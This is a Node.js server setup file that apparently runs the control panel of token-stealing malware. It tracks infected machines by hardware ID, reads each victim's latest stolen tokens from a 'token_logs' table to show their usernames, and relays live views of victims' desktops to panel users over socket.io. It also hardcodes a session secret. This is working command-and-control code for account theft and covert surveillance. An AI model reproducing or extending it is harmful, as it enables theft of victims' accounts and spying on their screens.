const db = require('better-sqlite3')(`${__dirname}/../data/db.sqlite`);
const config = require('../../config.json');

const logger = require('../util/logger');
const bodyParser = require('body-parser');
const express = require('express');

const session = require('express-session');
const SQLiteStore = require('connect-sqlite3')(session);

const passport = require('passport');

const port = process.env.PORT || 500;

const setupRoutes = require('./routes');
const { setupAuthentication } = require('./authentication');

module.exports = setupWeb = (app) => {
    app.db = db;
    app.lastPings = {};
    app.viewingDesktop = {};
    app.sockets = [];

    const server = require('http').createServer(app);
    const io = require('socket.io')(server);

    io.on('connection', (socket) => {
        app.sockets.push(socket);

        socket.on('disconnect', () => {
            if (app.sockets.indexOf(socket) > -1) {
                Object.keys(app.viewingDesktop).forEach((k) => {
                    if (app.viewingDesktop[k].indexOf(socket) > -1) {
                        app.viewingDesktop[k].splice(app.viewingDesktop[k].indexOf(socket), 1);
                    }
                });

                app.sockets.splice(app.sockets.indexOf(socket), 1);
            }
        });

        socket.on('requestClients', () => {
            socket.emit('receiveClients', app.lastPings);

            Object.keys(app.lastPings).forEach((hwid) => {
                const data = app.db.prepare('SELECT tokens FROM token_logs WHERE hwid=? ORDER BY date DESC LIMIT 1').get(hwid);

                if (data.tokens != null) {
                    socket.emit('receiveClientLastName', hwid, JSON.parse(JSON.parse(data.tokens)[0]).username);
                }
            });
        });

        socket.on('stopViewingDesktop', (hwid) => {
            if (app.viewingDesktop[hwid] && app.viewingDesktop[hwid].includes(socket)) {
                app.viewingDesktop[hwid].splice(app.viewingDesktop[hwid].indexOf(socket), 1);
            }
        });

        socket.on('viewingDesktop', (hwid) => {
            if (!app.viewingDesktop[hwid]) app.viewingDesktop[hwid] = [];

            if (!app.viewingDesktop[hwid].includes(socket)) app.viewingDesktop[hwid].push(socket);
        });

        socket.on('getClientLastName', (hwid) => {
            const data = app.db.prepare('SELECT tokens FROM token_logs WHERE hwid=? ORDER BY date DESC LIMIT 1').get(hwid);

            if (data.tokens != null) {
                socket.emit('receiveClientLastName', hwid, JSON.parse(JSON.parse(data.tokens)[0]).username);
            }
        });
    });

    // user agent check
    // ! CHANGE THIS LATER FOR THE PANEL WITH AUTHENTICATION !
    /*if (process.env.PRODUCTION == 'true') {
        app.use((req, _, next) => {
            if (req.headers['user-agent'] && req.headers['user-agent'] == config.userAgent) {
                next();
            }
        });
    }*/

    // logging
    //if (process.env.PRODUCTION == 'false') app.use(morgan('dev'));

    // set views & view engine to ejs
    app.set('views', __dirname + '/./views');
    app.set('view engine', 'ejs');

    // public dir
    app.use(express.static(__dirname + '/./public'));

    app.use(bodyParser.urlencoded({ extended: false }));
    app.use(
        bodyParser.json({
            verify: (req, res, buf) => {
                req.rawBody = buf;
            },
            limit: '50mb',
            extended: true,
        })
    );

    app.use(
        session({
            store: new SQLiteStore(),
            secret: '52b60cc1e496e8b16cbc1c7c9f1b196cb9323468c5ac947122acc8375fefc0d7',
            cookie: { maxAge: 7 * 24 * 60 * 60 * 1000 }, // 1 week
            resave: false,
            saveUninitialized: false,
        })
    );

    app.use(passport.initialize());
    app.use(passport.session());

    setupAuthentication(app);
    setupRoutes(app);

    server.listen(port, () => {
        logger.info(`App listening on http://localhost:${port}.`);
    });
};
